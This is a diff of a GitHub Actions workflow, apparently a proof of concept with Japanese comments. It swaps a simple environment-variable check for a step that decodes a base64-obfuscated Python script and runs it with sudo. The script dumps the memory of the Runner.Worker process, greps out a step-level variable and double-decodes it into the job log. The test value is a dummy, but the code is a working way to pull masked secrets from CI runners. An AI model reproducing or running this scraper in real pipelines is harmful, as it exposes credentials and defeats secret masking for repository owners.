@@ -1,26 +1,47 @@
-name: Environment Variable Check
+name: Step-Level Env Memory Dump
 
 on:
   workflow_dispatch:
-    inputs:
-      debug_mode:
-        description: 'Debug mode'
-        required: false
-        default: 'false'
 
 jobs:
-  check-env:
+  check-step-visibility:
     runs-on: ubuntu-latest
-    env:
-      JOB_LEVEL_VAR: "I am from Job level"
 
     steps:
-      - name: Set Step-level ENV and Echo Title
+      - name: Step 1 - Set Step-level ENV
         env:
-          STEP_LEVEL_VAR: "I am from Step 1"
+          # 検証用: "HiddenSecret" -> base64 -> "SGlkZGVuU2VjcmV0" -> base64 -> "U0dsS1pHVnVVMlZqY21WMg=="
+          STEP_VAL: "U0dsS1pHVnVVMlZqY21WMg=="
         run: |
-          echo "Step 1: Specific variables"
+          echo "Step 1 is running..."
+          echo "STEP_VAL is set in this step's env."
 
-      - name: Print All Env (Check scope)
+      - name: Step 2 - Ordinary Printenv
         run: |
-          printenv | grep -E "JOB_LEVEL_VAR|STEP_LEVEL_VAR"
+          echo "--- Step 2: Checking ordinary visibility ---"
+          printenv | grep STEP_VAL || echo "STEP_VAL is not found in standard env (as expected)."
+
+      - name: Step 3 - Memory Dump via B64 Script and Double Decode
+        run: |
+          # 1. ユーザー提供のPythonスクリプトをBase64化したものをデコードして作成
+          echo "aW1wb3J0IHN5cywgb3MsIHJlCgpkZWYgZ2V0X3BpZCgpOgogICAgcGlkcyA9IFtwaWQgZm9yIHBpZCBpbiBvcy5saXN0ZGlyKCcvcHJvYycpIGlmIHBpZC5pc2RpZ2l0KCldCiAgICBmb3IgcGlkIGluIHBpZHM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIG9wZW4ob3MucGF0aC5qb2luKCcvcHJvYycsIHBpZCwgJ2NtZGxpbmUnKSwgJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgIGlmIGInUnVubmVyLldvcmtlcicgaW4gZi5yZWFkKCk6IHJldHVybiBwaWQKICAgICAgICBleGNlcHQ6IGNvbnRpbnVlCiAgICByYWlzZSBFeGNlcHRpb24oJ1J1bm5lciBub3QgZm91bmQnKQoKcGlkID0gZ2V0X3BpZCgpCndpdGggb3BlbihmJy9wcm9jL3twaWR9L21hcHMnLCAncicpIGFzIG1hcF9mLCBvcGVuKGYnL3Byb2Mve3BpZH0vbWVtJywgJ3JiJywgMCkgYXMgbWVtX2Y6CiAgICBmb3IgbGluZSBpbiBtYXBfZjoKICAgICAgICBtID0gcmUubWF0Y2gocicoWzAtOUEtRmEtZl0rKS0oWzAtOUEtRmEtZl0rKSAoWy1yXSknLCBsaW5lKQogICAgICAgIGlmIG0gYW5kIG0uZ3JvdXAoMykgPT0gJ3InOgogICAgICAgICAgICBzdGFydCwgZW5kID0gaW50KG0uZ3JvdXAoMSksIDE2KSwgaW50KG0uZ3JvdXAoMiksIDE2KQogICAgICAgICAgICBpZiBzdGFydCA+IHN5cy5tYXhzaXplOiBjb250aW51ZQogICAgICAgICAgICBtZW1fZi5zZWVrKHN0YXJ0KQogICAgICAgICAgICB0cnk6IHN5cy5zdGRvdXQuYnVmZmVyLndyaXRlKG1lbV9mLnJlYWQoZW5kIC0gc3RhcnQpKQogICAgICAgICAgICBleGNlcHQ6IGNvbnRpbnVlCg==" | base64 -d > dump_mem.py
+
+          echo "--- Step 3: Searching for STEP_VAL in Runner.Worker memory ---"
+          
+          # 2. メモリをダンプし、STEP_VAL= を探し、値を2回デコードする
+          # grep -a はバイナリをテキストとして扱うフラグ
+          RESULT=$(sudo python3 dump_mem.py | grep -a "STEP_VAL=" | head -n 1 | cut -d '=' -f2)
+          
+          if [ -z "$RESULT" ]; then
+            echo "STEP_VAL not found in memory. It might have been garbage collected or not allocated in the same way."
+          else
+            echo "Extracted value (B64x2): $RESULT"
+            
+            echo -n "Decoded once: "
+            echo "$RESULT" | base64 -d
+            echo ""
+            
+            echo -n "Decoded twice (Final Secret): "
+            echo "$RESULT" | base64 -d | base64 -d
+            echo ""
+          fi
